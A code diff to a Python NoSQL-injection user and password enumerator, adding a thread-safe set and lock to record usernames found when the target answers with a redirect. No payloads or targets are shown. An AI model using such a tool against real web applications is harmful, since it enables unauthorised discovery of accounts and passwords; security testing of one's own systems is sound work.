@@ -7,6 +7,10 @@ import concurrent.futures
 from colorama import Fore
 from urllib3.util import Retry
 from requests.adapters import HTTPAdapter
+import threading
+
+valid_usernames = set()
+lock = threading.Lock()
 
 def get_arguments():
     parser = argparse.ArgumentParser(description="NoSQL Injection User and Password Enumerator")
@@ -51,6 +55,8 @@ def process_payload(payload, characters, url, method, enum_parameter, password_p
                 r.raise_for_status()
 
                 if r.status_code == 302:
+                    with lock:
+                        valid_usernames.add(payload)
                     return payload  # Only return the payload if a match is found
 
             except requests.exceptions.RequestException as e:
@@ -87,9 +93,8 @@ def main():
                                [enum_parameter] * len(payloads), [password_parameter] * len(payloads), [other_parameters] * len(payloads), [session] * len(payloads))
         
         for userpass in results:
-            if userpass and userpass not in valid_usernames:
+            if userpass:
                 print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
-                valid_usernames.add(userpass)
 
     if not valid_usernames:
         print(Fore.RED + f"No {enum_parameter} found")
